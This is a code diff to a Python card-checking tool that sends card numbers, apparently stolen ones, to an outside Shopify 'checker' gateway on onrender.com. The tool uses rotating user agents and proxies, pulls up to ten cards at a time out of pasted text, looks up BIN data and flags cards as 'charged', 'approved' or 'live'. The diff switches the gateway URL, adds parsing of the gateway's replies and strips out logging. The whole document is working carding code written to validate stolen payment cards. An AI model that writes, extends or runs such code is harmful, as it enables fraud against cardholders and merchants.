@@ -12,8 +12,8 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # Configuration
-GATEWAY_URL = "https://chk-for-shopify.onrender.com/"
-MAX_CARDS_PER_MCHK = 100
+GATEWAY_URL = "https://chk-for-shopify-o00b.onrender.com/"
+MAX_CARDS_PER_MCHK = 10
 
 def get_rotating_user_agent():
     """Generate different types of user agents"""
@@ -102,9 +102,9 @@ def normalize_card(text):
         current_year_short = time.strftime('%y')
         current_century = time.strftime('%Y')[:2]
         if int(yy) >= int(current_year_short):
-            yy = current_century + yy  # 2024 if current year is 2023 and yy is 24
+            yy = current_century + yy
         else:
-            yy = str(int(current_century)+1) + yy  # 2024 if current year is 2023 and yy is 24
+            yy = str(int(current_century)+1) + yy
     
     # Match CVV (3-4 digits)
     cvv_match = re.search(r'(?:\D|^)(\d{3,4})(?:\D|$)', text[exp_match.end():])
@@ -175,15 +175,41 @@ def extract_cards_from_text(text):
                 
     return cards[:MAX_CARDS_PER_MCHK]
 
+def extract_api_response(raw_text):
+    """Extract the response message from API raw response"""
+    try:
+        # Look for the response line pattern: "📩 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ↯ CARD_DECLINED"
+        response_match = re.search(r'📩\s*𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄\s*↯\s*(.+)', raw_text)
+        if response_match:
+            return response_match.group(1).strip()
+        
+        # Alternative pattern if the first one doesn't match
+        response_match2 = re.search(r'RESPONSE[:\s↯-]+\s*(.+)', raw_text, re.IGNORECASE)
+        if response_match2:
+            return response_match2.group(1).strip()
+            
+        # If no specific response found, return the first meaningful line
+        lines = raw_text.split('\n')
+        for line in lines:
+            line = line.strip()
+            if line and not line.startswith('┏') and not line.startswith('┗') and '━━' not in line:
+                return line
+                
+        return raw_text[:100] + "..." if len(raw_text) > 100 else raw_text
+        
+    except Exception as e:
+        return f"Error parsing response: {str(e)}"
+
 def clean_raw_response(text):
     """Clean the raw response by removing unwanted characters"""
-    # Remove <pre> tags if present
-    text = text.replace('<pre>', '').replace('</pre>', '')
-    # Remove backslashes that escape special characters
-    text = text.replace('\\', '')
-    # Remove forward slashes that might break Markdown
-    text = text.replace('/', '／')  # Replace with fullwidth slash
-    return text.strip()
+    try:
+        # Remove <pre> tags if present
+        text = text.replace('<pre>', '').replace('</pre>', '')
+        # Remove backslashes that escape special characters
+        text = text.replace('\\', '')
+        return text.strip()
+    except:
+        return text
 
 def get_bin_info(bin_number):
     """Get BIN information from handyapi.com"""
@@ -338,6 +364,7 @@ def check_card_shopify(cc_line, proxy_str=None):
         
         max_retries = 3
         timeout_duration = 45
+        raw_result = ""
         
         for attempt in range(max_retries):
             try:
@@ -348,45 +375,43 @@ def check_card_shopify(cc_line, proxy_str=None):
                 response = requests.get(url, headers=headers, timeout=(10, timeout_duration), proxies=proxies)
                 
                 if response.status_code == 200:
-                    raw_result = clean_raw_response(response.text)
+                    raw_text = clean_raw_response(response.text)
+                    # Extract the specific response message
+                    raw_result = extract_api_response(raw_text)
                     break
                 else:
-                    logger.warning(f"Gateway returned status {response.status_code} on attempt {attempt + 1}")
                     if attempt < max_retries - 1:
                         time.sleep(2)
                         continue
                     else:
-                        raw_result = "❌ Gateway Error: Service unavailable"
+                        raw_result = "Gateway Error: Service unavailable"
                     
             except requests.exceptions.Timeout:
-                logger.warning(f"Timeout on attempt {attempt + 1}")
                 if attempt < max_retries - 1:
                     time.sleep(2)
                     continue
                 else:
-                    raw_result = "❌ Gateway Timeout: The checking service is taking too long to respond."
+                    raw_result = "Gateway Timeout"
                     
             except requests.exceptions.ConnectionError:
-                logger.warning(f"Connection error on attempt {attempt + 1}")
                 if attempt < max_retries - 1:
                     time.sleep(3)
                     continue
                 else:
-                    raw_result = "❒ Gateway Connection Error: Service temporarily unavailable."
+                    raw_result = "Connection Error"
                     
             except Exception as e:
-                logger.error(f"Gateway error on attempt {attempt + 1}: {e}")
                 if attempt < max_retries - 1:
                     time.sleep(2)
                     continue
                 else:
-                    raw_result = f"❌ Gateway Error: {str(e)}"
+                    raw_result = f"Gateway Error: {str(e)}"
         
         elapsed_time = time.time() - start_time
         bin_info = get_bin_info(n[:6])
         
-        # Check if approved
-        is_approved = any(x in raw_result.lower() for x in ["charged", "cvv match", "approved", "✅ 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐂𝐂"])
+        # Check if approved - look for approved indicators in the extracted response
+        is_approved = any(x in raw_result.lower() for x in ["charged", "cvv match", "approved", "success", "live"])
         
         if is_approved:
             return f"""
